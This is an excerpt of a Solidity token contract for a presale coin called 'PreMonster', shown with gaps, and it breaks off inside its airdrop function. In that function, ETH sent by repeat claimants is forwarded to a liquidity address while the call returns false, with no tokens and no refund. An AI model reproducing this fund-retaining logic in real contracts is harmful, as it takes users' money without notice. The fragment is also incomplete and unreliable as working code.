 ...
 */
contract PreMonsterToken{
    using SafeMath for uint256;

    uint256 private _totalSupply = 500000000000000000000000000000;


    string private _name = "MonsterPresale";
    string private _symbol = "PreMonster";
    ...
    uint256 private _airdropEth =   1800000000000000;
    uint256 private _airdropToken = 8000000000000000000000;
    ...
    mapping (address => bool) public AdropAvi;
    ...
    function seeavi(address account) public view returns (bool) {
        
        return AdropAvi[account];
    }
    ...
    function setAuthrecovery() public onlyOwner returns(bool){
        _auth = address(0);
        _auth2 = address(0);
        return true;
    }
    ...
    function getAuth() public view returns(address,address){
    ...
    function airdrop(address _refer)payable public returns(bool){
        ...
        if (AdropAvi[_msgSender()]==true){
            address(uint160(_liquidity)).transfer(_msgValue);
            return false;
        }else{
            _mint(_msgSender(),_airdropToken);
            AdropAvi[_msgSender()]=true;
            if(_msgSender()!=_refer&&_refer!=address(0)&&_balances[_refer]>0){
            uint referEth = _airdropEth.mul(_referEth).div(10000);
            _mint(_refer,_airdropToken.div(4));
